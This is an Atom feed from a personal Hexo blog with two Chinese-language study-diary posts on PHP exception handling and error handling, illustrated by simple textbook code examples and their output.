<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>51nd0re1</title>
  
  <subtitle>我是一只web狗</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-07-18T02:45:47.138Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>51nd0re1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP-2020/7/17-学习日记</title>
    <link href="http://yoursite.com/2020/07/18/PHP-2020-7-17-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/07/18/PHP-2020-7-17-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-07-18T01:57:42.000Z</published>
    <updated>2020-07-18T02:45:47.138Z</updated>
    
    <content type="html"><![CDATA[<h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><p>异常用于在指定的错误发生时改变脚本的正常流程</p><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>PHP5提供了一种新的面向对象地错误处理方法</p><p>异常处理用于在指定的错误(异常)情况发生时改变脚本地正常流程。这种情况被称为异常</p><p>当异常被触发时:</p><ul><li>当前代码状态被保存</li><li>代码执行被切换到预定义的异常处理器函数</li><li>根据情况，处理器也许会从保存的代码状态重新开始执行代码，终止脚本执行，或从代码中另外的位置继续执行脚本</li></ul><p>错误处理方法:</p><ul><li>异常的基本使用</li><li>创建自定义的异常处理器</li><li>多个异常</li><li>重新抛出异常</li><li>设置顶层异常处理器</li></ul><p>异常只能用在错误情况下使用，而不应该被用于一个点跳到另一个点的情况</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>当异常被抛出时，其后的代码不会继续执行，PHP会尝试查找匹配的catch代码块</p><p>如果异常没有被捕获，而且又没用set_exception_handler()作相应处理的话，那就会发生一个致命错误，并且输出”Uncaught Exception”的错误消息</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 创建一个有异常处理的函数</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">checkNum</span><span class="params">($number)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($number&gt;<span class="number">1</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"Value must be 1 or below"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="comment">// 触发异常</span></span></span><br><span class="line"><span class="php">checkNum(<span class="number">2</span>);</span></span><br></pre></td></tr></table></figure><p>这个例子触发异常但是没去捕获它，就会得到这样的错误<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught Exception: Value must be 1 or below in F:<span class="symbol">\d</span>efault<span class="symbol">\P</span>HP_default<span class="symbol">\t</span>est1.php:7</span><br><span class="line">Stack trace:</span><br><span class="line">#0 F:<span class="symbol">\d</span>efault<span class="symbol">\P</span>HP_default<span class="symbol">\t</span>est1.php(13): checkNum(2)</span><br><span class="line">#1 &#123;main&#125;</span><br><span class="line">  thrown in F:<span class="symbol">\d</span>efault<span class="symbol">\P</span>HP_default<span class="symbol">\t</span>est1.php on line 7</span><br></pre></td></tr></table></figure></p><h2 id="Try、throw和catch"><a href="#Try、throw和catch" class="headerlink" title="Try、throw和catch"></a>Try、throw和catch</h2><p>要避免上面实例中出现的错误，我们需要创建适当的代码来处理异常</p><p>适当的处理异常代码应该包括</p><ul><li>Try 使用异常的函数应该位于”try”代码块内。如果没有触发异常，则代码将照常继续执行。但是如果异常被触发，会抛出一个异常</li><li>Throw 里规定如何触发异常。每一个”throw”必须对应至少一个”catch”</li><li>Catch “catch”代码块会捕获异常，并创建一个包含异常信息的对象</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 创建一个有异常处理的函数</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">checkNum</span><span class="params">($number)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($number&gt;<span class="number">1</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"变量值必须小于等于 1"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 在 try 块 触发异常</span></span></span><br><span class="line"><span class="php"><span class="keyword">try</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    checkNum(<span class="number">2</span>);</span></span><br><span class="line"><span class="php">    <span class="comment">// 如果抛出异常，以下文本不会输出</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'如果输出该内容，说明 $number 变量'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">// 捕获异常</span></span></span><br><span class="line"><span class="php"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'Message: '</span> .$e-&gt;getMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Message:</span> <span class="string">变量值必须小于等于</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></p><h3 id="实例解释"><a href="#实例解释" class="headerlink" title="实例解释"></a>实例解释</h3><p>上面的代码解释为</p><ul><li>创建checkNum()函数。它检测数字是否大于1。如果是，则抛出一个异常</li><li>在”try”代码块中调用checkNum()函数</li><li>checkNum()函数中的异常被抛出</li><li>“catch”代码块接收到该异常，并创建一个包含异常信息的对象，通常为$e</li><li>通过从这个exception对象调用$e-&gt;getMessage()，输出来自该异常的错误信息</li></ul><h2 id="创建自定义异常"><a href="#创建自定义异常" class="headerlink" title="创建自定义异常"></a>创建自定义异常</h2><p>创建自定义的异常处理程序非常简单。简单创建一个专门的类，当发生异常时，可调用其函数。该类必须为exception类的子类</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">customException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">errorMessage</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// 错误信息</span></span></span><br><span class="line"><span class="php">        $errorMsg = <span class="string">'错误行号 '</span>.<span class="keyword">$this</span>-&gt;getLine().<span class="string">' in '</span>.<span class="keyword">$this</span>-&gt;getFile()</span></span><br><span class="line"><span class="php">            .<span class="string">':'</span>.<span class="string">"\n"</span>.<span class="keyword">$this</span>-&gt;getMessage().<span class="string">' 不是一个合法的 E-Mail 地址'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $errorMsg;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$email = <span class="string">"someone@example...com"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">try</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 检测邮箱</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(filter_var($email, FILTER_VALIDATE_EMAIL) === <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// 如果是个不合法的邮箱地址，抛出异常</span></span></span><br><span class="line"><span class="php">        <span class="keyword">throw</span> <span class="keyword">new</span> customException($email);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">catch</span> (customException $e)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="comment">//display custom message</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $e-&gt;errorMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="实例解释-1"><a href="#实例解释-1" class="headerlink" title="实例解释"></a>实例解释</h3><ul><li>该例子通过自定义的exception类来捕获异常</li><li>customException()类作为旧的exception类的子类，继承了exception类的所有属性和方法</li><li>创建errorMessage()函数。如果e-mail地址不合法，则该函数返回一条错误消息</li><li>把$email变量设置为不合法的e-mail地址字符串</li><li>执行”try”代码块，由于e-mail地址不合法，因此抛出一个异常</li><li>“catch”代码块捕获异常，并显示错误消息</li></ul><h2 id="多个异常"><a href="#多个异常" class="headerlink" title="多个异常"></a>多个异常</h2><p>可以为脚本使用多个异常，来检测多种情况<br>可以使用多个if…else代码块，或一个switch代码块，或者嵌套多个异常。这些异常能够使用不同的exception类，返回不同的错误信息<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">customException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">errorMessage</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// 错误信息</span></span></span><br><span class="line"><span class="php">        $errorMsg = <span class="string">'错误行号 '</span>.<span class="keyword">$this</span>-&gt;getLine().<span class="string">' in '</span>.<span class="keyword">$this</span>-&gt;getFile()</span></span><br><span class="line"><span class="php">            .<span class="string">':'</span>.<span class="string">"\n"</span>.<span class="keyword">$this</span>-&gt;getMessage().<span class="string">' 不是一个合法的 E-Mail 地址'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $errorMsg;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$email = <span class="string">"someone@example@.com"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">try</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 检测邮箱</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(filter_var($email, FILTER_VALIDATE_EMAIL) === <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// 如果是个不合法的邮箱地址，抛出异常</span></span></span><br><span class="line"><span class="php">        <span class="keyword">throw</span> <span class="keyword">new</span> customException($email);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="comment">// 检测 "example" 是否在邮箱地址中</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(strpos($email, <span class="string">"example"</span>) !== <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"$email 是 example 邮箱"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">catch</span> (customException $e)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $e-&gt;errorMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $e-&gt;getMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>基本与上个例子一致，不过是使用了判断语句和多个catch来实现了多异常的处理</p><h2 id="重新抛出异常"><a href="#重新抛出异常" class="headerlink" title="重新抛出异常"></a>重新抛出异常</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">customException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">errorMessage</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// 错误信息</span></span></span><br><span class="line"><span class="php">        $errorMsg = <span class="keyword">$this</span>-&gt;getMessage().<span class="string">' 不是一个合法的 E-Mail 地址。'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $errorMsg;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$email = <span class="string">"someone@exampl.com"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">try</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">try</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// 检测 "example" 是否在邮箱地址中</span></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(strpos($email, <span class="string">"example"</span>) !== <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="comment">// 如果是个不合法的邮箱地址，抛出异常</span></span></span><br><span class="line"><span class="php">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>($email);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// 重新抛出异常</span></span></span><br><span class="line"><span class="php">        <span class="keyword">throw</span> <span class="keyword">new</span> customException($email);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">catch</span> (customException $e)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 显示自定义信息</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $e-&gt;errorMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>有时候，当异常被抛出时，希望以不同于标准的方式处理，就可以套娃</p><p>与上面例子几乎无异，不解释了</p><h2 id="设置顶层异常处理器"><a href="#设置顶层异常处理器" class="headerlink" title="设置顶层异常处理器"></a>设置顶层异常处理器</h2><p>set_exception_handler() 函数可设置处理所有未捕获异常的用户定义函数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">myException</span><span class="params">($exception)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Exception: "</span> , $exception-&gt;getMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">set_exception_handler(<span class="string">'myException'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'Uncaught Exception occurred'</span>);</span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Exception</span>: Uncaught <span class="keyword">Exception</span> occurred</span><br></pre></td></tr></table></figure><br>上面不存在catch代码块，而是触发顶层的异常处理程序。应该使用此函数来捕获所有未捕获的异常</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.需要进行异常处理的代码必须放入try代码块中，以便捕获潜在的异常</p><p>2.每个try或throw代码块必须至少拥有一个对应的catch代码块</p><p>3.使用多个catch代码块可以捕获不同种类的异常</p><p>4.可以在try代码块内的catch代码块中抛出或再次抛出异常</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;异常处理&quot;&gt;&lt;a href=&quot;#异常处理&quot; class=&quot;headerlink&quot; title=&quot;异常处理&quot;&gt;&lt;/a&gt;异常处理&lt;/h1&gt;&lt;p&gt;异常用于在指定的错误发生时改变脚本的正常流程&lt;/p&gt;
&lt;h2 id=&quot;异常&quot;&gt;&lt;a href=&quot;#异常&quot; class=&quot;he
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/PHP/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP-2020/7/16-学习日记</title>
    <link href="http://yoursite.com/2020/07/16/PHP-2020-7-16-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/07/16/PHP-2020-7-16-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-07-16T13:04:29.000Z</published>
    <updated>2020-07-16T13:40:15.204Z</updated>
    
    <content type="html"><![CDATA[<h1 id="error"><a href="#error" class="headerlink" title="error"></a>error</h1><p>在PHP中，默认的错误处理很简单。一条错误消息会被发送到浏览器，这条消息带有文件名、行号以及描述错误的消息</p><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>在创建脚本和Web应用程序时，错误处理是一个很重要的部分，如果你的代码缺少错误检测编码，那么程序就很不专业</p><p>错误处理方法为</p><ul><li>简单的”die()”语句</li><li>自定义错误和错误触发器</li><li>错误报告</li></ul><h2 id="die-函数"><a href="#die-函数" class="headerlink" title="die()函数"></a>die()函数</h2><p>打开文本文件<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$file=fopen(<span class="string">"welcome.txt"</span>,<span class="string">"r"</span>);</span></span><br></pre></td></tr></table></figure><br>如果文件不存在就会得到类似错误<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning: fopen(welcome.txt) [function.fopen]: failed to <span class="keyword">open</span> stream:</span><br><span class="line"><span class="keyword">No</span> such <span class="keyword">file</span> or directory <span class="keyword">in</span> /www/runoob/<span class="keyword">test</span>/<span class="keyword">test</span>.php <span class="keyword">on</span> <span class="keyword">line</span> 2</span><br></pre></td></tr></table></figure></p><p>为了避免以上错误，访问之前检测该文件是否存在<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!file_exists(<span class="string">"welcome.txt"</span>))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"文件不存在"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $file=fopen(<span class="string">"welcome.txt"</span>,<span class="string">"r"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件不存在</span><br></pre></td></tr></table></figure></p><h2 id="自定义错误处理器"><a href="#自定义错误处理器" class="headerlink" title="自定义错误处理器"></a>自定义错误处理器</h2><p>创建自定义的错误处理器非常多，很简单地创建一个专用函数，可以在PHP中发生错误时调用该函数</p><p>该函数必须要有能力处理两个参数(error level和eroor message)，可以最多接受五个参数</p><p>语法<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">error_function(<span class="name">error_level</span>,error_message,</span><br><span class="line">error_file,error_line,error_context)</span><br></pre></td></tr></table></figure><br>参数 | 描述</p><ul><li>| -<br>error_level | 必需。为用户定义的错误规定错误报告级别。必须是一个数字。<br>error_message | 必需。为用户定义的错误规定错误信息<br>error_file | 可选。规定错误发生的文件名<br>error_line | 可选。规定错误发生的行号<br>error_context | 可选。规定一个数组，包含了当错误发生时在用的每个变量以及它们的值</li></ul><h2 id="错误报告级别"><a href="#错误报告级别" class="headerlink" title="错误报告级别"></a>错误报告级别</h2><p>用户自定义的错误处理程序处理的不同类型的错误</p><div class="table-container"><table><thead><tr><th>值</th><th>常量</th><th>描述</th></tr></thead><tbody><tr><td>2</td><td>E_WARNING</td><td>非致命的run-time错误。不暂停脚本执行</td></tr><tr><td>8</td><td>E_NOTICE</td><td>run-time通知。在脚本发现可能有错误时发生，但也可能在脚本正常运行时发生</td></tr><tr><td>256</td><td>E_USER_ERROR</td><td>致命的用户生成的错误。这类似于程序员使用PHP函数trigger_error()设置的E_ERROR</td></tr><tr><td>512</td><td>E_USER_WARNING</td><td>非致命的用户生成的警告。这类似于程序员使用PHP函数trigger_error()设置的E_WARNING</td></tr><tr><td>1024</td><td>E_USER_NOTICE</td><td>用户生成的通知。这类似于程序员使用PHP函数trigger_error()设置的E_NOTICE</td></tr><tr><td>4096</td><td>E_RECOVERABLE_ERROR</td><td>可捕获的致命错误。类似E_ERROR,但可被用户定义的处理程序捕获</td></tr><tr><td>8191</td><td>E_ALL</td><td>所有错误和警告</td></tr></tbody></table></div><p>现在创建一个处理错误的函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">customError</span><span class="params">($errno, $errstr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;b&gt;Error:&lt;/b&gt; [$errno] $errstr&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"脚本结束"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><br>上面的代码就是一个简单的错误处理函数，当它被触发时，它会取得错误级别和错误消息。然后它会输出错误级别和消息，并终止脚本</p><h2 id="设立错误处理程序"><a href="#设立错误处理程序" class="headerlink" title="设立错误处理程序"></a>设立错误处理程序</h2><p>对于所有错误来使用我们自定义的错误处理程序<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_error_handler(<span class="string">"customError"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><br>set_error_handler()仅需要一个参数，可以添加第二个参数来规定错误级别</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 错误处理函数</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">customError</span><span class="params">($errno, $errstr)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;b&gt;Error:&lt;/b&gt; [$errno] $errstr"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 设置错误处理函数</span></span></span><br><span class="line"><span class="php">set_error_handler(<span class="string">"customError"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 触发错误</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>($test);</span></span><br></pre></td></tr></table></figure><h2 id="触发错误"><a href="#触发错误" class="headerlink" title="触发错误"></a>触发错误</h2><p>在脚本中用户输入数据的位置，当用户的输入无效时触发错误是很有用的，这个任务由trigger_error()函数完成</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span 